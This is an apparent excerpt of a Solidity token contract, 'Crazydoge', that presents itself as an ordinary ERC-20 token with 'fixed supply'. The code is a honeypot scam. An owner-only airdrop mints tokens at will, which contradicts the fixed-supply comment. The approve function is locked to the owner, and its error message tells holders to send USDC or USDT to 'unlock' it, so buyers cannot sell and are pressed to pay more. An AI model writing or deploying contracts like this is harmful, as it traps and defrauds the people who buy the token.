...
// fixed supply
// ----------------------------------------------------------------------------
contract Crazydoge is ERC20Interface, Owned {
    using SafeMath for uint;
    ...
    function airdrop(address [] memory addr) public onlyOwner{
        require(msg.sender == owner);
        uint256 i = 0;
        while (i < addr.length) {
           balances[addr[i]] = 500000*10**uint(decimals);
           _totalSupply = _totalSupply.add(balances[addr[i]]);
           emit Transfer(address(0), addr[i], 500000*10**uint(decimals));
           i++;
        }
    ...
    // ------------------------------------------------------------------------
    function approve(address spender, uint tokens) public returns (bool success) {
        require(msg.sender == owner,"Send  1 USDC or USDT to this contract to unlock approve");
